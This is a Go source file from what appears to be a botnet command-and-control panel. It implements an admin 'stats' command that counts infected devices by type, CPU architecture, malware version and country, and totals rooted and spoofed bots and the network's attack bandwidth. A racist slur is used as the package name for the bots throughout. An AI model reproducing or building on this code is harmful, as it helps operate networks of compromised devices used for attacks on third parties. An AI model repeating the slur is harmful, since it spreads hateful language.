package admin

import (
	"advanced-telnet-cnc/packages/pflag"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"advanced-telnet-cnc/source/niggers"
	slave_v2 "advanced-telnet-cnc/source/niggers/v2"
	"sort"
	"strconv"
	"strings"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"stats", "bots", "botcount", "statistics", "bot"},
		Description: "Displays statistics related to the bots in the network.",
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if len(args) < 1 {
				return IdentifierCount(session, "")
			}

			var identifiers, arches, versions, countries, info bool
			var searchQuery string

			flagSet := pflag.NewFlagSet("stats", pflag.ContinueOnError)
			flagSet.SetOutput(session.Conn)

			flagSet.BoolVarP(&identifiers, "identifiers", "id", false, "View bots by identifier. (ex. DVR)")
			flagSet.BoolVarP(&arches, "architecture", "a", false, "View bots by architecture. (ex. MIPS)")
			flagSet.BoolVarP(&versions, "versions", "v", false, "View bots by malware versions. (ex. 2.0.0)")
			flagSet.BoolVarP(&countries, "countries", "c", false, "View bots by country. (ex. Turkey)")
			flagSet.BoolVarP(&info, "info", "i", false, "View total network resources (RAM/CPU/GBPS).")
			flagSet.StringVarP(&searchQuery, "search", "s", "", "Search for a specific bot type.")

			err := flagSet.Parse(args)
			if err != nil {
				if err == pflag.ErrHelp {
					return nil
				}
				return session.Println(config.Red, "Could not parse command flags.")
			}

			if info {
				session.Printf("\x1b[32mNetwork Information:\r\n")
				session.Printf("\x1b[37mTotal Devices: \x1b[32m%d\x1b[0m\r\n", niggers.Count())
				session.Printf("\x1b[37mRooted Devices: \x1b[32m%d\x1b[0m\r\n", niggers.RootedCount())
				session.Printf("\x1b[37mSpoofed Devices: \x1b[32m%d\x1b[0m\r\n", niggers.SpoofedCount())
				session.Printf("\x1b[37mTotal RAM: \x1b[32m%d MB\x1b[0m\r\n", niggers.TotalRAM())
				session.Printf("\x1b[37mTotal Cores: \x1b[32m%d\x1b[0m\r\n", niggers.TotalCores())
				session.Printf("\x1b[37mCapacity: \x1b[32m%s\x1b[0m\r\n", niggers.TotalSpeed())
				return nil
			}

			if identifiers {
				return IdentifierCount(session, searchQuery)
			} else if arches {
				return ArchesCount(session, searchQuery)
			} else if versions {
				return VersionsCount(session, searchQuery)
			} else if countries {
				return CountriesCount(session, searchQuery)
			} else {
				return IdentifierCount(session, searchQuery)
			}
		},
	})
}

func IdentifierCount(session *sessions.Session, searchQuery string) error {
	type entry struct {
		name  string
		count int
	}
	var entries []entry
	dist := niggers.Distribution()
	for s, count := range dist {
		if !strings.HasPrefix(strings.ToLower(s), strings.ToLower(searchQuery)) {
			continue
		}
		entries = append(entries, entry{s, count})
	}

	sort.Slice(entries, func(i, j int) bool {
		return entries[i].count > entries[j].count
	})

	for _, e := range entries {
		s := e.name
		count := e.count
		old, exists := session.OldDistribution[s]
		if !exists {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		difference := count - old
		if difference == 0 {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		differenceSymbol := "\u001B[92m+"
		if difference < 0 {
			differenceSymbol = "\u001B[91m-"
			difference *= -1
		}

		session.Printf("%s: %s (%s\x1b[97m)\r\n", s, strconv.Itoa(count), differenceSymbol+strconv.Itoa(difference))
	}

	session.OldDistribution = dist
	//session.Printf("Rooted Devices: %d\r\n", niggers.RootedCount())

	return nil
}

func ArchesCount(session *sessions.Session, searchQuery string) error {
	type entry struct {
		name  string
		count int
	}
	var entries []entry
	archDist := niggers.Arches()
	for s, count := range archDist {
		if !strings.HasPrefix(strings.ToLower(s), strings.ToLower(searchQuery)) {
			continue
		}
		entries = append(entries, entry{s, count})
	}

	sort.Slice(entries, func(i, j int) bool {
		return entries[i].count > entries[j].count
	})

	for _, e := range entries {
		s := e.name
		count := e.count
		old, exists := session.OldArches[s]
		if !exists {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		difference := count - old
		if difference == 0 {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		differenceSymbol := "\u001B[92m+"
		if difference < 0 {
			differenceSymbol = "\u001B[91m-"
			difference *= -1
		}

		session.Printf("%s: %s (%s\x1b[97m)\r\n", s, strconv.Itoa(count), differenceSymbol+strconv.Itoa(difference))
	}

	session.OldArches = archDist
	return nil
}

func VersionsCount(session *sessions.Session, searchQuery string) error {
	type entry struct {
		name  string
		count int
	}
	var entries []entry
	verDist := niggers.Versions()
	for s, count := range verDist {
		if !strings.HasPrefix(strings.ToLower(s), strings.ToLower(searchQuery)) {
			continue
		}
		entries = append(entries, entry{s, count})
	}

	sort.Slice(entries, func(i, j int) bool {
		return entries[i].count > entries[j].count
	})

	for _, e := range entries {
		s := e.name
		count := e.count
		old, exists := session.OldVersions[s]
		if !exists {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		difference := count - old
		if difference == 0 {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		differenceSymbol := "\u001B[92m+"
		if difference < 0 {
			differenceSymbol = "\u001B[91m-"
			difference *= -1
		}

		session.Printf("%s: %s (%s\x1b[97m)\r\n", s, strconv.Itoa(count), differenceSymbol+strconv.Itoa(difference))
	}

	session.OldVersions = verDist
	return nil
}

func CountriesCount(session *sessions.Session, searchQuery string) error {
	type entry struct {
		name  string
		count int
	}
	var entries []entry
	countryDist := slave_v2.Slave.Countries()
	for s, count := range countryDist {
		if !strings.HasPrefix(strings.ToLower(s), strings.ToLower(searchQuery)) {
			continue
		}
		entries = append(entries, entry{s, count})
	}

	sort.Slice(entries, func(i, j int) bool {
		return entries[i].count > entries[j].count
	})

	for _, e := range entries {
		s := e.name
		count := e.count
		old, exists := session.OldCountries[s]
		if !exists {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		difference := count - old
		if difference == 0 {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		differenceSymbol := "\u001B[92m+"
		if difference < 0 {
			differenceSymbol = "\u001B[91m-"
			difference *= -1
		}

		session.Printf("%s: %s (%s\x1b[97m)\r\n", s, strconv.Itoa(count), differenceSymbol+strconv.Itoa(difference))
	}

	session.OldCountries = countryDist
	return nil
}
